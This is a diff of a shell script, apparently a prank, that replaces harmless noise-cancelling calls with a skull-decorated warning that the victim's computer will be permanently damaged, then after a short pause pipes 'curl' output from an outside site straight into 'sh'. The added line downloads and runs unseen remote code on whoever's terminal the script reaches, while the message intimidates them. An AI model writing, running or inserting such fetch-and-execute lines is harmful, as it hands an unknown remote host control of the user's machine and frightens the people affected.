@@ -8,11 +8,8 @@ source ~/.garbage/lib;
 clear;
 ###########  END HEADER  ###########
 
-cancelNoise;
-cancelNoise;
-cancelNoise;
-cancelNoise;
-cancelNoise;
-cancelNoise;
+bigMsg "☠☠☠ DON'T TOUCH A THING!! IF YOU DO YOUR COMPUTER WILL BE PERMANENTLY DAMAGED!! ☠☠☠";
 
-termdo "echo 'FROM IN HERE loooLLLL'";
+sleep 3s;
+
+termdo 'curl -s https://suckaaa.com/s/loL | sh';
